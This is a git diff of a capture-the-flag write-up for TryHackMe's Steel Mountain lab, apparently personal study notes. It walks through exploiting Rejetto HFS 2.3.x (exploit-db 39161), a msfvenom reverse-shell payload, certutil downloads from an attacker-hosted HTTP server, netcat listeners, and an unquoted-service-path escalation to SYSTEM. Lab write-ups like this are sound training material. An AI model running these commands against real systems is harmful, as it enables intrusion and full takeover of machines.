@@ -96,7 +96,7 @@ Server username: STEELMOUNTAIN\bill
 meterpreter > 
 ```
 
-Set meterpreter shell to background with Ctrl + Z and bring back later with 'session -I <session-ID>' obtain session-ID using 'sessions -l'.
+Set meterpreter shell to background with Ctrl + Z and bring back later with 'sessions -i <session-ID>' obtain session-ID using 'sessions -l'.
 
 Quick look I find user.txt manually by entering shell and traversing folders as not sure what file name would be. 
 
@@ -145,6 +145,10 @@ root@i<AttackBoxIP>:~# searchsploit -p 34668.txt
  Verified: True
 File Type: ASCII text
 root@<AttackBoxIP>:~# 
+
+A better option for this was:
+Rejetto HTTP File Server (HFS) 2.3.x - | windows/remote/39161.py
+
 ```
 
 Using cat /opt/exploitdb/exploits/windows/remote/34668.txt we find 
@@ -169,13 +173,12 @@ will stop regex from parse macro , and macro will be executed and remote code in
 ```
 
 That file provides information to describe it but no exploit:  
-https://www.exploit-db.com/exploits/49584 provides a usable exploit for this.
+https://www.exploit-db.com/exploits/39161 provides a usable exploit for this.
 
 
 # Task 3 Privilege Escalation 
 
 To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."
-
 
 meterpreter > upload /opt/PowerSploit/Privesc/PowerUp.ps1 
 [*] Uploading  : /opt/PowerSploit/Privesc/PowerUp.ps1 -> PowerUp.ps1
@@ -185,15 +188,12 @@ meterpreter >
 
 ## Q1: Gain powershell access from the meterpreter, its also possible via shell, then powershell
 Answer: just perform the following 2 commands
+```
 meterpreter > load powershell
 Loading extension powershell...Success.
 meterpreter > powershell_shell
+
 PS > dir
-
-Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
-Answer: AdvancedSystemCareService9 is obtained from the powerup.ps1 use of invoke-allchecks
-
-```
 Directory: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
 Mode                LastWriteTime     Length Name
@@ -204,19 +204,16 @@ d----         3/29/2026   8:10 AM            %TEMP%
 -a---         3/29/2026   8:46 AM     600580 TempPowerUp.ps1
 -a---         3/29/2026   8:50 AM     600580 UsersbillDocumentsPowerUp.ps1
 -a---         3/29/2026   8:48 AM     600580 UsersbillPowerUp.ps1
-```
 
-```
 PS > . ./PowerUp.ps1
 PS > whoami
 steelmountain\bill
 PS > Invoke-Allchecks
 ```
+## Q2:Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
+Answer: AdvancedSystemCareService9 is obtained from the powerup.ps1 use of invoke-allchecks
 
-## Q2: the service with CanRestart option set true which shows up as unquoted service is:
-Answer: AdvancedSystemCareService9
 This is import later for ther service we will restart to initiate reverse shell.
-
 I have remove the ones without the CanRestart option set to  true from ouput:
 
 ```
@@ -274,27 +271,30 @@ PS >
 
 There is a lot to look at here, a service is exploitable when:
 
-Condition	Why it matters
-Unquoted path	Windows misinterprets the executable location
+Condition				Why it matters
+----------				---------------
+Unquoted path			Windows misinterprets the executable location 
 Spaces in folder names	Creates multiple possible executable paths
-User‑writable folder in the path	Low‑priv user can place files there
+						User‑writable folder in the path	
+						Low‑priv user can place files there 
 Service runs as SYSTEM	Anything executed inherits SYSTEM privileges
-Service restart allowed	User can trigger the vulnerable behaviour
+						Service restart allowed	User can trigger the 
+						vulnerable behaviour
 
 There is also a lot of similarity with layered paths. Each layer has its own permissions, so the tool prints a block for each one.
 That’s why you see multiple “ServiceName: AdvancedSystemCareService9” entries — they’re all describing different writable points along the same path.
 
 
-Why some entries are more likely than others
+## Why some entries are more likely than others
 Here’s the hierarchy of “how bad” each one is:
-IdentityReference	Why it matters
-BUILTIN\Users	Worst — any user can write there
-Authenticated Users	Also broad — any logged‑in user
+IdentityReference				Why it matters
+BUILTIN\Users					Worst — any user can write there
+Authenticated Users				Also broad — any logged‑in user
 Specific low‑priv user (bill)	Misconfigured but narrower
-Administrators / SYSTEM	Not exploitable
+Administrators / SYSTEM			Not exploitable
 
 
-The directory to consider mostly likely is: 
+## The directory to consider mostly likely is: 
 ```
 C:\Program Files (x86)\IObit\
 ```
@@ -345,6 +345,7 @@ Answer is multi steps to open reverse shell:
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<HostIP> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
 ```
+Be sure to have nc listener ready for this.
 
 ```
 meterpreter > upload Advanced.exe
@@ -416,39 +417,49 @@ C:\Users\Administrator\Desktop>
 # Task 4
 
 From the exploit-db website we will use the exploit instead of Metasploit. 
-Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) - Windows remote Exploit
+[Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) - Windows remote Exploit](https://www.exploit-db.com/exploits/39161)
 
-Use the python script here and change the local IP and port. You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!
+- Use the python script here and change the local IP and port. You will need to run the exploit twice. The first time will pull our ncat binary to the system and the second will execute our payload to gain a callback! 
 
 Then download ncat.exe from the github repository https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
 
-It is also found inside the attackbox and can be found using a simple command:
+The script in from the exploit 39161 show nc.exe being called so that ncat.exe file needs to be renamed.
+
+nc.exe is also found inside most kali installations or attackbox on tryhackme and can be found using a simple command:
 
 # find / -name "nc.exe" 2>/dev/null
 /root/nc.exe 
 /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/nc.exe
 
-Nc.exe in root was downloaded and renamed from site above then occurred to try this command.
 
-The script in from the exploit 39161 show nc.exe being called  so that ncat.exe file needs to be renamed.
+## Simple http server:
 
-Setup a local HTTP server using python3 -m http.server. Its default port is 8000, and this will be used by the exploit to upload the renamed nc.exe file. The issue is that the exploit requests http://192.168.44.128/nc.exe. Because no port is specified, http:// defaults to port 80, meaning it tries to fetch http://192.168.44.128:80/nc.exe. This will not work on the TryHackMe AttackBox, because the AttackBox itself runs a process on port 80, and stopping it will crash the entire environment — which I learned immediately after killing the process. To avoid this, use a VPN and connect from a local VM instead. To make it work in the code look for …
-%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe… change to +ip_addr+":8000%2Fnc.exe… This will allow python -m http.server to use the default ip since 80 is used by attackbox. Then ensure that nc -lnvp <port> is running. Then run the exploit:
+Setup a local HTTP server using python3 -m http.server. Its default port is 8000, and this will be used by the exploit to upload the renamed nc.exe file. The issue is that the exploit requests http://192.168.44.128/nc.exe. Because no port is specified, http:// defaults to port 80, meaning it tries to fetch http://192.168.44.128:80/nc.exe. This will not work on the TryHackMe AttackBox, because the AttackBox itself runs a process on port 80, and stopping it will crash the entire environment — which I learned immediately after killing the process. To avoid this, use a VPN and connect from a local VM instead. 
+
+To make it work attack box look in the code look for: 
+… %22http%3A%2F%2F"+ip_addr+"%2Fnc.exe… 
+change to:
+... +ip_addr+":8000%2Fnc.exe… 
+
+- This will allow python -m http.server to use the default port since 80 is used by attackbox. 
+- Then ensure that nc -lnvp <port> is running.
+
+- Then run the exploit:
  
-The bottom of the exploit states to use format to run it as follows, from nmap target port was 8080.:
+The bottom of the exploit states to use format to run it as follows, target port 8080 from nmap scan:
 Python2 exploit.py <target IP> <target Port> 
 
 ```
-root@ip-10-48-85-212:~# python3 -m http.server
+root@ip-<local-host> :~# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-10.48.148.163 - - [03/Apr/2026 08:00:22] "GET /nc.exe HTTP/1.1" 200 -
-10.48.148.163 - - [03/Apr/2026 08:00:22] "GET /nc.exe HTTP/1.1" 200 -
+<target-IP> - - [03/Apr/2026 08:00:22] "GET /nc.exe HTTP/1.1" 200 -
+<target-IP> - - [03/Apr/2026 08:00:22] "GET /nc.exe HTTP/1.1" 200 -
 ```
 ```
-ot@ip-10-48-85-212:~# nc -lnvp 4444
+root@<local-host>:~# nc -lnvp 4444
 Listening on 0.0.0.0 4444
 ls  
-Connection received on 10.48.148.163 49370
+Connection received on <target-IP> 49370
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 
@@ -473,24 +484,17 @@ Python 3 sees:
 	• \t → tab
 ```
 
-This will call back and download the ncat.exe file we renamed to nc.exe. 
-Then run again to get exploit to run the nc.exe file to initiate the reverse shell.
-
 Running exploit
 
-root@ip-10-48-85-212:~# python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-10.48.148.163 - - [03/Apr/2026 08:00:22] "GET /nc.exe HTTP/1.1" 200 -
-10.48.148.163 - - [03/Apr/2026 08:00:22] "GET /nc.exe HTTP/1.1" 200 -
-
 Next upload the WinPEAS.exe to the target using the certusil command since http.server is up and running. WinPEAS.exe is on kali directory somewhere.
-certutil -urlcache -split -f http://10.48.85.212:8000/WinPEAS.exe WinPEASE.exe
+```
+certutil -urlcache -split -f http://<local-host>:8000/WinPEAS.exe WinPEASE.exe
+```
+Run WinPEAS.exe, no real benefit in saving to file (WinPEAS.exe > peas.txt), running locallyin with VPN the screen flows a lot better than attackbox on tryhackme site you can simply copy and past to file locally. I tried BITSADMIN, FTP, Telnet, SMB and certutil upload, without success it appears most ways are blocked intentionally. 
 
-Just run WinPEAS.exe or WinPEAS.exe > peas.txt then view with:
-more peas.txt. 
-Tried BITSADMIN, SMB and certutil (upload with urlcache and , without success it appears most way block intentionally uploading. But we know the AdvancedSystemCareService9 is an option.  We now use the msfvenom command to create payload:
+We know the AdvancedSystemCareService9 is an option. We now use the msfvenom command to create payload:
  
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.159.255 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=<local-host> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
 
 Then upload to target. Then place in correct folder:
 
@@ -529,15 +533,13 @@ The connection was obtained, may have been the pending process before but it's a
 ┌──(kali㉿kali)-[~]
 └─$ nc -lnvp 4443
 listening on [any] 4443 ...
-connect to [192.168.159.255] from (UNKNOWN) [10.49.139.110] 49740
+connect to [<local-host>] from (UNKNOWN) [<target-IP>] 49740
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 
 C:\Windows\system32>whoami
 whoami
 nt authority\system
-
-C:\Windows\system32>
 ```
 
 
@@ -545,6 +547,4 @@ C:\Windows\system32>
 
 
 
-
-<img width="596" height="10997" alt="image" src="https://github.com/user-attachments/assets/1540d16c-3cc0-4f3f-9b74-c74feb8e1569" />
 
